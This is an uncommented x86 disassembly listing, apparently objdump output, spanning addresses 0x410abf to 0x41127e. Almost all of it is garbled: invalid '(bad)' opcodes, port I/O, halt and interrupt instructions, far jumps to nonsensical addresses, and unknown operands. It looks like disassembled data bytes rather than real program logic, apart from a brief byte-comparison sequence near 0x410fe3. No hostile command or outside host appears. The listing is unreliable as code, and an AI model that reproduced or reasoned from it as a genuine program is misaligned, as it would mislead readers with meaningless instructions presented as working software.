  410abf:	(bad)  
  410ac0:	jmp    0x4be434cb
  410ac5:	repnz outs dx,DWORD PTR ds:[esi]
  410ac7:	inc    edi
  410ac8:	xchg   esi,eax
  410ac9:	cmp    BYTE PTR [eax+0x2702e99b],al
  410acf:	arpl   bx,si
  410ad1:	fwait
  410ad2:	repz add bl,BYTE PTR [edx]
  410ad5:	jbe    0x410abd
  410ad7:	pop    esi
  410ad8:	mov    ebp,0xb723dfd4
  410add:	mov    eax,ds:0x7a71b13a
  410ae2:	jo     0x410b4b
  410ae4:	outs   dx,DWORD PTR es:[esi]
  410ae6:	sbb    eax,0x1d28b7fd
  410aeb:	fdivr  DWORD PTR [edx+eax*4-0x13]
  410aef:	mov    ds:0xe9194098,eax
  410af4:	jmp    0x61a09a0
  410af9:	xchg   bh,cl
  410afb:	inc    BYTE PTR [edx+0x22]
  410afe:	ror    ah,1
  410b00:	imul   esi,ebp,0x1ed4e1f3
  410b06:	aas    
  410b07:	mov    al,0x27
  410b09:	cmp    cl,dl
  410b0b:	in     eax,0x78
  410b0d:	push   cs
  410b0e:	ret    
  410b0f:	clc    
  410b10:	xchg   BYTE PTR [ecx+0x3b],dh
  410b13:	sbb    BYTE PTR [ebp*8-0x1165b963],bl
  410b1a:	xchg   ebp,eax
  410b1b:	test   DWORD PTR [edi+0x58fb8fbc],eax
  410b21:	test   eax,0xe74d2ec9
  410b26:	inc    eax
  410b27:	mov    edx,0x9ae41780
  410b2c:	imul   ebx,DWORD PTR [eax+esi*1],0x60
  410b30:	push   esi
  410b31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b32:	jp     0x410b39
  410b34:	add    ebp,DWORD PTR [edi+edi*1-0x29]
  410b38:	xchg   ecx,eax
  410b39:	in     eax,0x99
  410b3b:	cwde   
  410b3c:	xchg   ebx,eax
  410b3d:	scas   eax,DWORD PTR es:[edi]
  410b3e:	xchg   edi,eax
  410b3f:	mov    ch,0xd4
  410b41:	shl    BYTE PTR [eax],0x37
  410b44:	pop    ss
  410b45:	sahf   
  410b46:	inc    edx
  410b47:	push   ebp
  410b48:	pushf  
  410b49:	mov    BYTE PTR [ecx-0x25],dh
  410b4c:	xlat   BYTE PTR ds:[ebx]
  410b4d:	fwait
  410b4e:	xlat   BYTE PTR ds:[ebx]
  410b4f:	mov    ds:0xff9b41d8,eax
  410b54:	push   esp
  410b55:	mov    esi,0x4218e838
  410b5a:	test   DWORD PTR [edi+0x39],ebx
  410b5d:	mov    esi,0xc7a3f0db
  410b62:	outs   dx,DWORD PTR ds:[esi]
  410b63:	adc    DWORD PTR [eax+0x459830be],ebx
  410b69:	push   edx
  410b6a:	sbb    eax,0x74a40bed
  410b6f:	test   al,0x5c
  410b71:	mov    bh,BYTE PTR [ecx]
  410b73:	mov    ah,0xd9
  410b75:	out    0xbe,al
  410b77:	push   0x3635b19a
  410b7c:	jb     0x410bbc
  410b7e:	aad    0xb
  410b80:	repz in eax,0xc1
  410b83:	jecxz  0x410b48
  410b85:	dec    ecx
  410b86:	scas   eax,DWORD PTR es:[edi]
  410b87:	ins    BYTE PTR es:[edi],dx
  410b88:	fnstsw WORD PTR [ebx]
  410b8a:	std    
  410b8b:	mov    ecx,0x9c01cba7
  410b90:	pop    es
  410b91:	fild   DWORD PTR [ecx+0x3aef4c8e]
  410b97:	push   edx
  410b98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b99:	or     eax,0x12c39e3
  410b9e:	mov    DWORD PTR [ebx-0x7a],0xda67fa75
  410ba5:	gs je  0x410b69
  410ba8:	clc    
  410ba9:	sbb    BYTE PTR [edx-0x2f33ae71],bl
  410baf:	imul   ebp,DWORD PTR [ecx+0x41eb08d2],0x33fdd151
  410bb9:	push   es
  410bba:	mov    ebx,0x2589a9bf
  410bbf:	mov    eax,?
  410bc1:	and    ebp,DWORD PTR [edi]
  410bc3:	push   es
  410bc4:	loop   0x410bf3
  410bc6:	or     dh,BYTE PTR [esi]
  410bc8:	xor    BYTE PTR [ebp-0x4b],bh
  410bcb:	test   BYTE PTR [edx+0x6201befa],0x2
  410bd2:	js     0x410bc8
  410bd4:	pusha  
  410bd5:	in     eax,0x30
  410bd7:	enter  0xb953,0xc1
  410bdb:	nop
  410bdc:	xor    al,0xc9
  410bde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bdf:	add    al,0xbd
  410be1:	ficom  WORD PTR [edx-0xfecfdde]
  410be7:	outs   dx,DWORD PTR ds:[esi]
  410be8:	inc    edx
  410be9:	mov    edi,0xfc6edd
  410bee:	sbb    ebx,DWORD PTR [ecx-0x239d3077]
  410bf4:	xchg   ebx,eax
  410bf5:	jp     0x410c2d
  410bf7:	ret    
  410bf8:	in     eax,0xcc
  410bfa:	outs   dx,BYTE PTR ds:[esi]
  410bfb:	jecxz  0x410bf2
  410bfd:	adc    dh,dh
  410bff:	sub    ah,BYTE PTR [eax+0x13f217aa]
  410c05:	ins    BYTE PTR es:[edi],dx
  410c06:	fmul   QWORD PTR [esi-0x6b]
  410c09:	test   eax,0x52a67a8e
  410c0e:	add    ebp,edx
  410c10:	call   0xaa165fc1
  410c15:	add    eax,0x25a1ddf0
  410c1a:	(bad)  
  410c1b:	into   
  410c1c:	jbe    0x410c53
  410c1e:	(bad)  
  410c20:	push   ds
  410c21:	lahf   
  410c22:	add    dl,BYTE PTR [ecx-0x52]
  410c25:	dec    esp
  410c26:	outs   dx,DWORD PTR ds:[esi]
  410c27:	popf   
  410c28:	cmp    eax,0xc10a6a3d
  410c2d:	popa   
  410c2e:	dec    ebp
  410c2f:	adc    al,0x8a
  410c31:	mov    ds:0xa547d2da,eax
  410c36:	jmp    0x410c12
  410c38:	mov    bh,0x24
  410c3a:	or     al,0x10
  410c3c:	xor    eax,0xa6f0003a
  410c41:	push   cs
  410c42:	test   al,0xfd
  410c44:	and    al,0xa7
  410c46:	pop    ebp
  410c47:	bnd jbe 0x410c96
  410c4a:	hlt    
  410c4b:	ror    BYTE PTR [edi+0x6],0x98
  410c4f:	jmp    0x410c0d
  410c51:	(bad)  
  410c52:	mov    dh,0x75
  410c54:	or     DWORD PTR [edi+eiz*1+0x79],ecx
  410c58:	push   cs
  410c59:	lods   al,BYTE PTR ds:[esi]
  410c5a:	or     ecx,esp
  410c5c:	push   ebx
  410c5d:	ffree  st(6)
  410c5f:	in     eax,dx
  410c60:	cmp    edx,eax
  410c62:	repz push ss
  410c64:	sbb    al,0x6f
  410c66:	outs   dx,DWORD PTR ds:[esi]
  410c67:	or     BYTE PTR [ecx-0x7d2684c0],dl
  410c6d:	(bad)  
  410c6e:	addr16 pop edi
  410c70:	mul    BYTE PTR [ebx]
  410c72:	mov    ebx,0x9a63b21
  410c77:	sbb    dl,BYTE PTR [esi]
  410c79:	xchg   DWORD PTR [ebp+0x51],edx
  410c7c:	inc    ecx
  410c7d:	pusha  
  410c7e:	jl     0x410ca9
  410c80:	les    edi,FWORD PTR [ebx]
  410c82:	sub    edx,DWORD PTR [edx+0x17]
  410c85:	call   0xfb1df0b
  410c8a:	mov    dl,0x2b
  410c8c:	mov    ah,0x5f
  410c8e:	retf   0x499b
  410c91:	add    dh,BYTE PTR [eax-0x12]
  410c94:	dec    ebp
  410c95:	jae    0x410c50
  410c97:	mov    eax,0xdc7bb405
  410c9c:	jg     0x410c4f
  410c9e:	push   ds
  410c9f:	je     0x410c2f
  410ca1:	xor    al,0x1c
  410ca3:	stc    
  410ca4:	push   edi
  410ca5:	mov    edx,0x567756fd
  410caa:	sub    ecx,esi
  410cac:	lods   al,BYTE PTR ds:[esi]
  410cad:	mov    edx,0x19cb655e
  410cb2:	cwde   
  410cb3:	sbb    BYTE PTR [ebp-0x7618968a],dh
  410cb9:	ins    DWORD PTR es:[edi],dx
  410cba:	or     eax,0xadbda822
  410cbf:	shr    edx,0xed
  410cc2:	jnp    0x410c57
  410cc4:	xlat   BYTE PTR ds:[ebx]
  410cc5:	mov    esp,0x3f09ec31
  410cca:	or     al,0x4
  410ccc:	jo     0x410d09
  410cce:	push   esp
  410ccf:	mov    ecx,0x8f917ac9
  410cd4:	jns    0x410ca4
  410cd6:	dec    edi
  410cd7:	push   cs
  410cd8:	iret   
  410cd9:	pop    ecx
  410cda:	push   ebp
  410cdb:	pop    eax
  410cdc:	mov    esi,0xe64dd24f
  410ce1:	inc    ebp
  410ce2:	push   ecx
  410ce3:	jmp    DWORD PTR [edi]
  410ce5:	hlt    
  410ce6:	int3   
  410ce7:	mov    edx,0x37955aa7
  410cec:	lahf   
  410ced:	dec    ecx
  410cee:	push   edx
  410cef:	push   0x995184f
  410cf4:	sti    
  410cf5:	hlt    
  410cf6:	(bad)  [edi-0xfd1808b]
  410cfc:	pop    ebp
  410cfd:	fwait
  410cfe:	add    ecx,DWORD PTR [ebx+0x14]
  410d01:	adc    BYTE PTR [esi-0x496accb6],bl
  410d07:	sbb    DWORD PTR [ebp-0x76f2a716],ecx
  410d0d:	add    cl,BYTE PTR [ebx-0x361607bb]
  410d13:	add    al,BYTE PTR [eax]
  410d15:	add    BYTE PTR [eax+ebp*1-0x2a],dh
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0x146e549c
  410d25:	mov    ebx,ebp
  410d27:	mov    eax,0x7caf7e7e
  410d2c:	jle    0x410dac
  410d2e:	xor    ebx,DWORD PTR [edi-0x60371137]
  410d34:	cmp    eax,0x21537547
  410d39:	popf   
  410d3a:	dec    edx
  410d3b:	mov    eax,eax
  410d3d:	icebp  
  410d3e:	int    0x40
  410d40:	push   esp
  410d41:	sub    edx,eax
  410d43:	icebp  
  410d44:	add    BYTE PTR [ebx],cl
  410d46:	ss sbb ebx,edi
  410d49:	add    al,0x4e
  410d4b:	add    dh,ah
  410d4d:	pop    esp
  410d4e:	fcmovne st,st(5)
  410d50:	mov    bh,0x79
  410d52:	mov    edx,DWORD PTR [edi+0x4b611b2c]
  410d58:	inc    ecx
  410d59:	mov    ds:0x5f9f1637,al
  410d5e:	sub    DWORD PTR [eax+0x7e165414],edx
  410d64:	call   0x6bd1:0xca0bcdb0
  410d6b:	add    ebx,edx
  410d6d:	sub    dl,dl
  410d6f:	jmp    0x410d50
  410d71:	out    0xeb,al
  410d73:	sub    eax,0x28bb01d
  410d78:	bound  esi,QWORD PTR [ecx-0x76cfdb5a]
  410d7e:	xchg   esi,eax
  410d7f:	dec    ebp
  410d80:	mov    ebp,0xae055096
  410d85:	dec    esi
  410d86:	and    edi,ebp
  410d88:	or     eax,0xb1b0107a
  410d8d:	mov    ch,BYTE PTR [esi]
  410d8f:	stc    
  410d90:	xor    DWORD PTR [ecx-0x23ade5e],edx
  410d96:	ret    0x6f21
  410d99:	mov    dl,0xf3
  410d9b:	mov    ss,ebp
  410d9d:	sub    BYTE PTR [ebp+0x47351fa7],dl
  410da3:	push   esi
  410da4:	bound  esp,QWORD PTR [edx-0x7f]
  410da7:	shl    DWORD PTR [esi],cl
  410da9:	sbb    ch,BYTE PTR [eax]
  410dab:	dec    ebx
  410dac:	in     al,dx
  410dad:	mov    ch,0xc4
  410daf:	in     al,dx
  410db0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410db1:	cmp    DWORD PTR [eax-0x621a99],edi
  410db7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410db8:	jp     0x410dab
  410dba:	dec    edx
  410dbb:	fisub  DWORD PTR [ebp+0x66]
  410dbe:	pop    ds
  410dbf:	push   ebx
  410dc0:	aas    
  410dc1:	stos   DWORD PTR es:[edi],eax
  410dc2:	xchg   ebx,eax
  410dc3:	aaa    
  410dc4:	cmc    
  410dc5:	nop
  410dc6:	cli    
  410dc7:	cmp    DWORD PTR [edi],ecx
  410dc9:	mov    dl,BYTE PTR [eax+0x0]
  410dcc:	and    eax,0xc9c1a558
  410dd1:	imul   ecx,DWORD PTR [ebx-0x49f7268a],0xd7566177
  410ddb:	inc    ebp
  410ddc:	les    ebp,FWORD PTR [ebx+0x3eaf0f22]
  410de2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410de3:	lds    edi,FWORD PTR [edx+ebx*1+0x2aa58d9d]
  410dea:	jl     0x410db4
  410dec:	inc    eax
  410ded:	jecxz  0x410e6e
  410def:	in     eax,dx
  410df0:	aas    
  410df1:	mov    eax,ds:0x6ba5b951
  410df6:	mov    al,0x5d
  410df8:	dec    edi
  410df9:	and    DWORD PTR [eax-0x7a],eax
  410dfc:	sar    BYTE PTR [edx],0xb3
  410dff:	arpl   sp,bp
  410e01:	dec    DWORD PTR [ebx-0x43833ccc]
  410e07:	cmp    DWORD PTR [ecx+0x5a88e6d6],ebp
  410e0d:	add    esp,DWORD PTR [eax]
  410e0f:	lods   al,BYTE PTR ds:[esi]
  410e10:	aam    0x44
  410e12:	inc    ebx
  410e13:	sub    ch,BYTE PTR [ebp+0x6020ca06]
  410e19:	push   ss
  410e1a:	jge    0x410e06
  410e1c:	fnstsw WORD PTR [edi]
  410e1e:	adc    esp,DWORD PTR ds:0x9c46
  410e23:	dec    edi
  410e24:	xlat   BYTE PTR ds:[ebx]
  410e25:	sub    dh,BYTE PTR [esi]
  410e27:	mov    dl,0x11
  410e29:	fisttp DWORD PTR [eax+0x2f]
  410e2c:	and    esp,esi
  410e2e:	pop    ecx
  410e2f:	out    0x16,eax
  410e31:	hlt    
  410e32:	or     WORD PTR [eax],si
  410e35:	dec    esi
  410e36:	mov    bh,0xc4
  410e38:	call   0x815d:0xcdf22b9e
  410e3f:	and    al,0x7
  410e41:	jbe    0x410e1d
  410e43:	xchg   BYTE PTR [esi],al
  410e45:	jl     0x410e27
  410e47:	push   es
  410e48:	(bad)  
  410e49:	outs   dx,DWORD PTR ds:[esi]
  410e4a:	in     al,dx
  410e4b:	mov    esi,0x87e181b1
  410e50:	cmc    
  410e51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e52:	call   0x2bfe:0x155efb28
  410e59:	icebp  
  410e5a:	adc    esp,edi
  410e5c:	fcmovne st,st(1)
  410e5e:	jae    0x410dea
  410e60:	adc    edi,edi
  410e62:	jmp    0x1d82:0x3ed0c53b
  410e69:	add    BYTE PTR [edi],bh
  410e6b:	repnz mov eax,ds:0x605e7d66
  410e71:	adc    BYTE PTR [ebp-0x7b],ah
  410e74:	ret    0x4d8e
  410e77:	and    ebx,DWORD PTR [ebx-0x79]
  410e7a:	stos   BYTE PTR es:[edi],al
  410e7b:	loopne 0x410e75
  410e7d:	gs xchg edx,eax
  410e7f:	inc    edx
  410e80:	pop    ebx
  410e81:	test   DWORD PTR ds:0x3213a21c,ebp
  410e87:	iret   
  410e88:	mov    al,0x96
  410e8a:	fs inc edi
  410e8c:	aaa    
  410e8d:	mov    eax,0x1ff6f6dd
  410e92:	out    0x3f,al
  410e94:	dec    ecx
  410e95:	push   esp
  410e96:	loope  0x410efa
  410e98:	test   DWORD PTR [edi-0x37b8976c],esi
  410e9e:	in     eax,dx
  410e9f:	push   0xffffffd3
  410ea1:	mov    dh,0x71
  410ea3:	mov    ecx,0x6ff52b1d
  410ea8:	mov    ss,WORD PTR [ebp+0x2d]
  410eab:	push   es
  410eac:	cwde   
  410ead:	xchg   DWORD PTR [ebp+eiz*2+0x3e3b6db9],edx
  410eb4:	ficom  WORD PTR [ebp+0x79ea3481]
  410eba:	rol    DWORD PTR [edx+ecx*4+0x55],1
  410ebe:	mov    esp,0xbb9fc114
  410ec3:	daa    
  410ec4:	das    
  410ec5:	ret    0x3d0b
  410ec8:	mov    DWORD PTR [ebp+eiz*1+0x5eb55c1d],esi
  410ecf:	test   BYTE PTR [edi-0x6ebf5cb9],dh
  410ed5:	cmp    ebx,DWORD PTR [edi+0x78]
  410ed8:	(bad)  
  410ed9:	loop   0x410f40
  410edb:	clc    
  410edc:	push   ss
  410edd:	adc    al,0xc5
  410edf:	pop    ebx
  410ee0:	pop    esi
  410ee1:	adc    dh,ah
  410ee3:	xor    DWORD PTR [eax+esi*4+0x17],ecx
  410ee7:	jnp    0x410f47
  410ee9:	into   
  410eea:	sbb    BYTE PTR fs:[ebx-0x4e7548e0],ah
  410ef1:	mov    al,0xb0
  410ef3:	mov    ds:0xadb6eaa2,eax
  410ef8:	push   0xffffff91
  410efa:	mov    ?,WORD PTR [eax-0x2ecbc8ee]
  410f00:	aad    0x4d
  410f02:	retf   0xf13e
  410f05:	lds    edx,FWORD PTR [eiz*8+0x16760a3c]
  410f0c:	(bad)  
  410f0d:	loopne 0x410f53
  410f0f:	test   eax,0x628270c4
  410f14:	or     ah,ch
  410f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f17:	in     al,0x13
  410f19:	and    eax,0xe6b0c63a
  410f1e:	not    BYTE PTR [ebx+0x715877c]
  410f24:	test   eax,0x77338d78
  410f29:	popf   
  410f2a:	sbb    esp,DWORD PTR [esi]
  410f2c:	jmp    0x979744cb
  410f31:	push   esp
  410f32:	add    bl,BYTE PTR [edx]
  410f34:	or     eax,0xdb926d0e
  410f39:	or     al,BYTE PTR [ebx+0x7c943240]
  410f3f:	stos   DWORD PTR es:[edi],eax
  410f40:	out    0x9c,eax
  410f42:	(bad)  
  410f43:	sar    BYTE PTR [esp+esi*8-0x7],1
  410f47:	mov    ds:0x7b06747c,al
  410f4c:	outs   dx,BYTE PTR ds:[esi]
  410f4d:	add    edx,DWORD PTR [ebx]
  410f4f:	push   esi
  410f50:	dec    ecx
  410f51:	sbb    BYTE PTR [ebx-0x849928],ah
  410f57:	lahf   
  410f58:	jae    0x410ef7
  410f5a:	fimul  DWORD PTR [ecx]
  410f5c:	(bad)  
  410f5e:	mov    edx,0xe5ebd2e8
  410f63:	dec    ebx
  410f64:	push   es
  410f65:	or     esi,DWORD PTR [edx]
  410f67:	mov    ch,0x4e
  410f69:	imul   eax,DWORD PTR [ebp+0x58],0x176451d7
  410f70:	imul   esp,DWORD PTR [edx-0x4b6c8375],0x5e2b457c
  410f7a:	jmp    0x10:0x982bb2c1
  410f81:	addr16 pop ds
  410f83:	fild   WORD PTR [eax]
  410f85:	fcmovne st,st(6)
  410f87:	into   
  410f88:	xchg   ebx,eax
  410f89:	and    dh,BYTE PTR [esi]
  410f8b:	sar    BYTE PTR [ebx+0x6],1
  410f8e:	mov    bh,0x6b
  410f90:	and    eax,0xe02db0d3
  410f95:	(bad)  
  410f96:	cmp    esi,esp
  410f98:	push   edi
  410f99:	xor    bh,BYTE PTR [eax]
  410f9b:	xchg   ebx,edi
  410f9d:	rol    BYTE PTR [ebx-0xad6aef2],1
  410fa3:	jl     0x410fd6
  410fa5:	addr16 pop esi
  410fa7:	fidivr DWORD PTR [edi+0x55]
  410faa:	aaa    
  410fab:	shr    BYTE PTR [eax],0x18
  410fae:	and    bh,BYTE PTR [esi-0x16]
  410fb1:	or     BYTE PTR [eax-0xf1b5156],0x3d
  410fb8:	es dec esi
  410fba:	and    al,0x49
  410fbc:	and    DWORD PTR [eax+0x56],0x19c780c1
  410fc3:	and    esp,DWORD PTR [esi-0x42]
  410fc6:	aam    0xe6
  410fc8:	add    al,0x2f
  410fca:	jg     0x410f61
  410fcc:	aas    
  410fcd:	ficomp WORD PTR [si-0x47]
  410fd1:	mov    dh,0xd3
  410fd3:	jle    0x410fe4
  410fd5:	jne    0x411039
  410fd7:	mov    WORD PTR [edi-0xfd51288],?
  410fdd:	idiv   BYTE PTR [edi-0x39fc3ecd]
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x410fac
  41102b:	bound  edx,QWORD PTR [ebx+0x7e471886]
  411031:	jle    0x410fe2
  411033:	jl     0x4110b3
  411035:	jle    0x41104a
  411037:	adc    dh,BYTE PTR [edi]
  411039:	mov    eax,0xa303d1f7
  41103e:	cld    
  41103f:	add    al,0xde
  411041:	sti    
  411042:	lahf   
  411043:	ret    0x9d88
  411046:	mov    edx,0x21c696cc
  41104b:	push   ebp
  41104c:	xor    esi,ecx
  41104e:	popa   
  41104f:	(bad)  
  411050:	iret   
  411051:	adc    edi,edx
  411053:	iret   
  411054:	jge    0x4110b8
  411056:	arpl   di,sp
  411058:	lods   al,BYTE PTR ds:[esi]
  411059:	fiadd  WORD PTR [ecx]
  41105b:	int3   
  41105c:	ins    BYTE PTR es:[edi],dx
  41105d:	xor    esp,ecx
  41105f:	sub    al,0x3b
  411061:	test   DWORD PTR [edi-0x1957972f],esi
  411067:	mov    dl,0x12
  411069:	or     eax,edi
  41106b:	xor    esi,DWORD PTR [ebx+0x1f8650d]
  411071:	pop    esp
  411073:	add    eax,0x18c5bce
  411078:	call   0x8630:0xc43bd3db
  41107f:	cmp    ax,0x28e1
  411083:	mov    ch,0xd4
  411085:	mov    al,ds:0x50fc0fd9
  41108a:	rol    BYTE PTR [edi-0x65e16751],1
  411090:	or     DWORD PTR [edi+eiz*1],ebp
  411093:	mov    ch,0xc0
  411095:	enter  0xcfe1,0x54
  411099:	mov    dh,0x5c
  41109b:	jne    0x41106e
  41109d:	rcr    BYTE PTR [esi],1
  41109f:	push   0xffffff86
  4110a1:	jae    0x411045
  4110a3:	in     al,0x4c
  4110a5:	(bad)  
  4110a6:	lods   al,BYTE PTR ds:[esi]
  4110a7:	and    bl,dl
  4110a9:	pop    edx
  4110aa:	or     ch,dl
  4110ac:	push   cs
  4110ad:	loope  0x411103
  4110af:	das    
  4110b0:	xor    ch,BYTE PTR [edi+0x21d137af]
  4110b6:	test   DWORD PTR [ebp+0x15],edi
  4110b9:	test   al,al
  4110bb:	test   al,0x5f
  4110bd:	dec    esi
  4110be:	or     ecx,DWORD PTR [esi+ebx*4]
  4110c1:	sbb    dl,BYTE PTR [esi+0xc2c988d]
  4110c7:	jno    0x411070
  4110c9:	fsubr  QWORD PTR [eax+esi*8]
  4110cc:	imul   ecx,DWORD PTR [edx+0x379fd9d7],0xffffff9b
  4110d3:	or     BYTE PTR [ebx-0x14],0x24
  4110d7:	jo     0x4110bf
  4110d9:	jmp    0x4110dd
  4110db:	xor    al,0xb9
  4110dd:	shl    BYTE PTR [ebx],cl
  4110df:	lds    esi,FWORD PTR [edx-0x1d206bfd]
  4110e5:	lods   eax,DWORD PTR ds:[esi]
  4110e6:	in     eax,dx
  4110e7:	push   0xffffff8e
  4110e9:	inc    edx
  4110ea:	lahf   
  4110eb:	cmp    DWORD PTR [eax-0x3c],eax
  4110ee:	mov    dl,0x95
  4110f0:	mov    edi,DWORD PTR [ebx]
  4110f2:	adc    BYTE PTR [eax-0x3b],cl
  4110f5:	mov    BYTE PTR [ebx+0x68],bl
  4110f8:	jl     0x4110a9
  4110fa:	iret   
  4110fb:	inc    BYTE PTR [ebx+0x30]
  4110fe:	dec    ebx
  4110ff:	jns    0x411156
  411101:	cwde   
  411102:	js     0x4110c9
  411104:	push   cs
  411105:	rcl    esi,1
  411107:	ja     0x4110fa
  411109:	outs   dx,BYTE PTR ds:[esi]
  41110a:	add    bh,BYTE PTR [esi]
  41110c:	dec    edi
  41110d:	xor    bl,BYTE PTR [edx+0x2a392efa]
  411113:	lods   eax,DWORD PTR ds:[esi]
  411114:	lss    esi,FWORD PTR [ecx+0x16b2eb24]
  41111b:	mov    ecx,0x905251dd
  411120:	mov    DWORD PTR [esi+0x67dc931e],esp
  411126:	hlt    
  411127:	mov    ecx,ds
  411129:	jecxz  0x4110d6
  41112b:	sub    eax,edx
  41112d:	cmp    DWORD PTR [ebp-0x9],esi
  411130:	or     al,0x2e
  411132:	xchg   ecx,eax
  411133:	push   0xf
  411135:	add    BYTE PTR ds:0xa9afa93b,ah
  41113b:	jp     0x41112c
  41113d:	popfw  
  41113f:	into   
  411140:	cwde   
  411141:	nop
  411142:	out    dx,al
  411143:	mov    edi,0x2aaf8d84
  411148:	(bad)  
  41114a:	and    al,0x9
  41114c:	inc    edx
  41114d:	mov    ah,0xe9
  41114f:	stos   DWORD PTR es:[edi],eax
  411150:	sub    BYTE PTR [edi+edi*2-0xc7641b6],cl
  411157:	mov    dl,BYTE PTR [edx-0x7e]
  41115a:	int3   
  41115b:	icebp  
  41115c:	jp     0x41114f
  41115e:	xor    ch,dh
  411160:	mov    ebp,0xb6bb1b01
  411165:	inc    esi
  411166:	iret   
  411167:	mov    ebx,0xaafc83e0
  41116c:	and    DWORD PTR [ecx+0x200dfcb8],edi
  411172:	das    
  411173:	imul   eax,eax,0xffffff80
  411176:	mov    bl,0x90
  411178:	aaa    
  411179:	test   DWORD PTR [eax-0x53],ebp
  41117c:	iret   
  41117d:	mov    cl,0x2e
  41117f:	xor    edx,DWORD PTR [ebx+0xd]
  411182:	push   ds
  411183:	int    0xb9
  411185:	xchg   esp,eax
  411186:	jno    0x411195
  411188:	and    BYTE PTR [esp+edi*4],al
  41118b:	arpl   sp,cx
  41118d:	dec    eax
  41118e:	sub    edi,DWORD PTR [ebp+0x14]
  411191:	cmp    eax,0x40f7caea
  411196:	inc    esi
  411197:	push   esp
  411198:	xlat   BYTE PTR ds:[ebx]
  411199:	add    eax,0xfe471728
  41119e:	xchg   BYTE PTR [ecx-0x31b88c47],ah
  4111a4:	in     eax,0xc7
  4111a6:	xchg   esi,eax
  4111a7:	mov    WORD PTR ss:[ebx-0x1dbfb23e],?
  4111ae:	popf   
  4111af:	and    DWORD PTR [ecx+0x31d8ff0f],esi
  4111b5:	jno    0x411190
  4111b7:	xor    BYTE PTR [bx+di],bh
  4111ba:	mov    ds:0xef3b2bf3,al
  4111bf:	ins    DWORD PTR es:[edi],dx
  4111c0:	int3   
  4111c1:	outs   dx,BYTE PTR ds:[esi]
  4111c2:	test   eax,0xff1eaa9c
  4111c7:	std    
  4111c8:	repz mov bl,0xef
  4111cb:	xchg   esi,eax
  4111cc:	fild   DWORD PTR ss:0xc3cd20c2
  4111d3:	cmp    DWORD PTR [eax+0xd],esp
  4111d6:	mov    dh,0xa3
  4111d8:	ja     0x411236
  4111da:	out    0x62,eax
  4111dc:	aas    
  4111dd:	pusha  
  4111de:	add    ah,BYTE PTR [esi]
  4111e0:	inc    ebp
  4111e1:	mov    ds:0xf2756fbc,eax
  4111e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111e7:	out    0xee,al
  4111e9:	retf   
  4111ea:	pop    edx
  4111eb:	inc    eax
  4111ec:	aad    0x61
  4111ee:	jo     0x4111e0
  4111f0:	xor    cl,BYTE PTR [ebp+0x3f1d9648]
  4111f6:	dec    edi
  4111f7:	popa   
  4111f8:	push   0xffffffc5
  4111fa:	inc    ecx
  4111fb:	push   ebx
  4111fc:	push   0x40
  4111fe:	jnp    0x4111da
  411200:	les    ebx,FWORD PTR [eax+eax*4]
  411203:	fild   QWORD PTR [esi]
  411205:	sub    eax,0xb0338d8b
  41120a:	pop    ebp
  41120b:	inc    edi
  41120c:	jnp    0x4111cc
  41120e:	popf   
  41120f:	jns    0x411238
  411211:	pop    ecx
  411212:	out    dx,al
  411213:	test   BYTE PTR [edx+ebp*2+0x56324d16],al
  41121a:	js     0x4111e8
  41121c:	dec    esp
  41121d:	mov    ecx,0xc02c513c
  411222:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411223:	push   edi
  411224:	cwde   
  411225:	jbe    0x41128c
  411227:	stos   BYTE PTR es:[edi],al
  411228:	add    esp,edi
  41122a:	lods   eax,DWORD PTR ds:[esi]
  41122b:	stc    
  41122c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41122d:	add    eax,0xca09559c
  411232:	cmp    eax,0x70f458d8
  411237:	adc    ah,BYTE PTR [edx]
  411239:	imul   ecx,DWORD PTR [ecx],0xffffffea
  41123c:	leave  
  41123d:	jge    0x411274
  41123f:	cmovl  esp,edx
  411242:	in     eax,dx
  411243:	daa    
  411244:	aas    
  411245:	scas   eax,DWORD PTR es:[edi]
  411246:	std    
  411247:	aaa    
  411248:	mov    edx,0xd644a785
  41124d:	and    ebx,0x5d208bf8
  411253:	jg     0x411245
  411255:	int    0x6d
  411257:	imul   esi,DWORD PTR [ebx+0x6d],0xffffffc4
  41125b:	clc    
  41125c:	push   edi
  41125d:	push   ss
  41125e:	mov    al,0x8e
  411260:	lods   al,BYTE PTR ds:[esi]
  411261:	fucom  st(5)
  411263:	xor    al,0x6c
  411265:	push   edi
  411266:	fsubr  DWORD PTR ds:0xd5d4
  41126b:	pushf  
  41126c:	or     BYTE PTR [edi-0xe8f5e8c],bl
  411272:	lods   eax,DWORD PTR ds:[esi]
  411273:	xchg   ebp,eax
  411274:	sbb    esp,ebp
  411276:	xchg   DWORD PTR [edx+0x421007e2],edx
  41127c:	inc    edx
  41127d:	cld    
  41127e:	shl    BYTE PTR [ebx],1
